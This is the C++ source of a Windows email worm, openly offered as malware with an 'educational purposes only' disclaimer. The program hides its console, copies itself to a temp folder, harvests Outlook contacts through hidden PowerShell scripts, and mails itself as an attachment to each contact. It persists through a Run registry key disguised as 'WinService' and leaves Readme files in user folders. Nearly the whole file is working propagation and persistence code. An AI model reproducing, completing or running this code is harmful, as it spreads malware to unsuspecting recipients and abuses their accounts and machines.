/*
Director: vkastei
Can i use this code? Sure, 50% of the code aint mine too


EDUCATIONAL PURPOSES ONLY
I dont take any


*/

#include <iostream>
#include <windows.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <locale>
#include <regex>

//Variable Setup
namespace fs = std::filesystem;
const std::string WHITESPACE = " \n\r\t\f\v";

//Mail Arguments 
std::string Target = "asdf";
std::string EmailFrom = "asdfasdf";
std::string Subject = "Teste";
std::string Body = "Testeasdfasdf";
std::string Email = "asdf";
std::string Passw = "asdf";
std::string Credentials = "$SMTPClient.Credentials = New - Object System.Net.NetworkCredential(";
std::string attachmentPath = "C:/%TEMP%/test.exe";

//random stuff
bool isRestarted = false;
using dict_iterator = std::filesystem::recursive_directory_iterator;
namespace fs = std::filesystem;

//Outlook Mails path, Readme Paths, Normal Paths
std::vector <std::string> unresolved_paths;
std::vector <std::string> resolved_paths;
std::vector <std::string> readme_paths;
std::vector <std::string> resolved_mails;

constexpr int NewSize = 1000000;

//trim functions
inline std::string& ltrim(std::string& s, const char* t = " \t\n\r\f\v")
{
    s.erase(0, s.find_first_not_of(t));
    return s;
}

// trim from right
inline std::string& rtrim(std::string& s, const char* t = " \t\n\r\f\v")
{
    s.erase(s.find_last_not_of(t) + 1);
    return s;
}

inline std::string& trim(std::string& s, const char* t = " \t\n\r\f\v")
{
    return ltrim(rtrim(s, t), t);
}



inline std::string ltrim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return ltrim(s, t);
}

inline std::string rtrim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return rtrim(s, t);
}

inline std::string trim_copy(std::string s, const char* t = " \t\n\r\f\v")
{
    return trim(s, t);
}

//String Encoding (Didnt need that)
static std::string encodeString(std::string str) {
    std::string codepage_str = str;
    int size = MultiByteToWideChar(CP_ACP, MB_COMPOSITE, codepage_str.c_str(),
        codepage_str.length(), nullptr, 0);
    std::wstring utf16_str(size, '\0');
    MultiByteToWideChar(CP_ACP, MB_COMPOSITE, codepage_str.c_str(),
        codepage_str.length(), &utf16_str[0], size);

    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, utf16_str.c_str(),
        utf16_str.length(), nullptr, 0,
        nullptr, nullptr);
    std::string utf8_str(utf8_size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, utf16_str.c_str(),
        utf16_str.length(), &utf8_str[0], utf8_size,
        nullptr, nullptr);

    return utf8_str;
}

static std::string removeSpaces(std::string str)
{
    str.erase(remove(str.begin(), str.end(), ' '), str.end());
    return str;
}

static std::string removeNulls(std::string str) {
    str.erase(std::find(str.begin(), str.end(), '\0'), str.end());
    return str;
}

// Moves File to Temp on start for ease of use.
void moveFile() {
    
    char old[] = "test.exe";
    char newPath[] = "C:/%TEMP%/test.exe";

    try
    {
        rename(old, newPath);
    }
    catch (const std::exception&)
    {
       
    }


}

//Send Mails to every Mail in resolved mails
void sendMail() {

    for (std::string mail : resolved_mails) {
        
        
        Sleep(5000);
        std::ofstream ps;
        if (std::filesystem::exists("test.ps1")) {
            remove("test.ps1");

        }

        ps.open("test.ps1", std::ios::out | std::ios::in | std::ios::app);
        

        const char* fileLPCWSTR = "test.ps1";
        int attr = GetFileAttributes((LPCSTR)fileLPCWSTR);

        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
            SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
        }

         
        std::string powershell;
        const char* c = mail.c_str();
        mail.erase(std::remove_if(mail.begin(), mail.end(), ::isspace), mail.end());
        mail = std::regex_replace(mail, std::regex("^ +| +$|( ) +"), "$1");

        trim(mail);
        
        powershell += "$EmailTo = '" + mail + "'\n";
        Sleep(1000);
        powershell += "$EmailFrom = '" + EmailFrom + "'\n";
        powershell += "$Subject = '" + Subject + "'\n";
        powershell += "$Body = '" + Body + "'\n";
        powershell += "$filenameAndPath = '" + attachmentPath + "'\n";
        powershell += "$SMTPServer = 'smtp-mail.outlook.com'\n";
        powershell += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)\n";
        powershell += "$attachment = New - Object System.Net.Mail.Attachment($filenameAndPath)\n";
        powershell += "$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n";
        powershell += "$SMTPClient.EnableSsl = $true\n";
        powershell += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('" + Email + "', '" + Passw + "');\n";
        powershell += "$SMTPClient.Send($SMTPMessage)\n";

        ps << powershell;

        ps.close();
      
        system("powershell -ExecutionPolicy Bypass -F test.ps1");
        std::cout << "sended mail to " << mail << std::endl;
        Sleep(1000);

    }
          

}

// Gets Outlook Contacts with powershell and saves em in contacts.txt. Then resolves them in a vector (resolved_mails)
void lookForMail() {
    if (!(std::filesystem::exists("contacts.ps1"))) {
        std::ofstream ps;
        


        ps.open("contacts.ps1");
        const char* fileLPCWSTR = "contacts.ps1";
        int attr = GetFileAttributes((LPCSTR)fileLPCWSTR);
        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
            SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
        }
        ps << "$Outlook = New-Object -comobject Outlook.Application" << std::endl;
        ps << "$Contacts = $Outlook.session.GetDefaultFolder(10).items" << std::endl;
        ps << "$Contacts | Select Email1DisplayName | out-file -filepath C:/temp/contacts.txt" << std::endl;

        ps.close();
    }

    
    system("powershell ./contacts.ps1");
    
    std::ifstream contacts("C:/temp/contacts.txt");
    Sleep(1000);


    for (std::string line; getline(contacts, line);) {
        
        unsigned first = line.find("(");
        unsigned last = line.find_last_of(")");

        std::string strNew = line.substr(first + 1, last - first -1);
            
           
        if (strNew.find("@") != std::string::npos) {

             
            strNew = trim(strNew);
            std::string str;
            int index = 1;
            for (char c : strNew) {
                if (index % 2 == 0) {
                    str.push_back(c);
                }
                index++;
            }
            
            resolved_mails.push_back(str);
                   
        }
        
    }

    contacts.close();
   
}

// Try Catch for the Spread (check for error), just continue with code, when fails
void trySpread() {

    try
    {
        lookForMail();
        sendMail();
    }
    catch (...)
    {

    }
    

}

// Places Readme in Directories(Desktop, Pictures, Program Files, Downloads)
void placeReadmes() {

    TCHAR name[60];
    DWORD size = sizeof(name) / sizeof(name[0]);
    GetUserName(name, &size);
    std::string username(name);
    
    std::string read;

    
    
    
     readme_paths.push_back("C:/users/" + username + "/Desktop/");
    readme_paths.push_back("C:/users/" + username + "/Documents/");
    readme_paths.push_back("C:/users/" + username + "/Pictures/");
    readme_paths.push_back("C:/users/" + username + "/Program Files/");
    readme_paths.push_back("C:/users/" + username + "/Downloads/");
   
    //README CODE
    read += "Hi " + username + ",\n\n";
    read += "I know this message seems weird, but pls continue reading.\n";
    read += "These days every second file u download, is a virus or has a virus init.\n\n";
    read += "So just that u know, dont just click on random files that get send to you.\n";
    read += "Im sorry for bothering you, wasting your time and maybe also sending messages to your contacts...\n\n";
    read += "Spread the Message,\n\n";
    read += "UR NAME\n\n"; // WHATEVER U WANT TO CALL U
    read += "PS: ALL readme files will be deleted next restart";
    
    for (std::string path : readme_paths) {

        std::string readmePath = path + "Readme.txt";
        const char* str = readmePath.c_str();
        if (std::filesystem::exists(readmePath)) {
            remove(str);
        }
        std::ofstream readme(readmePath, std::ios::in | std::ios::out | std::ios::app);
        readme << read;
        std::cout << path << "README.txt" << " added Readme " << std::endl;
        readme.close();
    }
   
    
}
//Removes Virus from Startup
void removeStartup() {


    try
    {

        HKEY hkey;

        LONG lnRed = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hkey);

        lnRed = RegDeleteKeyExA(hkey, "WinService", KEY_WOW64_32KEY | KEY_WOW64_64KEY, 0);

        RegCloseKey(hkey);
    }
    catch (const std::exception&)
    {

    }

}
// Deletes The Readmes and the Virus from startup when PC is restarted or File was executed again(Function over this one)
void deleteOnRestart() {

 
    if(std::filesystem::exists("dk1j289s91lsz9d0f.tmp")) {
        for (std::string rem : readme_paths) {
            const char* buffer = rem.c_str();
            remove(buffer);
            

        }
        removeStartup();

    }
     
}

// Adds Virus to startup
void addStartup() {

    HKEY hkey;

    const char* service = "WinService";
    const char* path = "C:/%TEMP%/test.exe";
    std::fstream f("C:/%TEMP%/dk1j289s91lsz9d0f.tmp");

    try
    {
        LONG lnRed = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hkey);

        lnRed = RegSetValueEx(hkey, service, 0, REG_SZ, (unsigned char*)path, strlen(path));
       
        RegCloseKey(hkey);
    }
    catch (const std::exception&)
    {

    }

}

// Main Function
int main() {
    
    //Hides console
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    //Functions
    moveFile();
    trySpread();
    deleteOnRestart();
    addStartup();
    placeReadmes();
    
}

